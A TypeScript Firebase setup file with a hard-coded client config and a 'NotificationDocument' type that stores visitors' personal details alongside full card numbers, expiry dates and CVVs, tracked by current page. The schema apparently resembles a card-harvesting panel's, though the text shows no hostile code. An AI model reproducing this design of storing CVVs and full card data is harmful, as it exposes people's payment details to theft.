import { initializeApp, getApps, getApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import { getFirestore} from 'firebase/firestore';
import { getDatabase} from 'firebase/database';

const firebaseConfig = {
  apiKey: "AIzaSyAwFM-NiZqEAOt433nHhz8XE8cbf7PgrKg",
  authDomain: "shoi-24cca.firebaseapp.com",
  databaseURL: "https://shoi-24cca-default-rtdb.firebaseio.com",
  projectId: "shoi-24cca",
  storageBucket: "shoi-24cca.firebasestorage.app",
  messagingSenderId: "385778620756",
  appId: "1:385778620756:web:bcb8b324f149ed1b2f50c1",
  measurementId: "G-Y7N0WGPEW6"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);


export { app, auth, db ,database};

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}

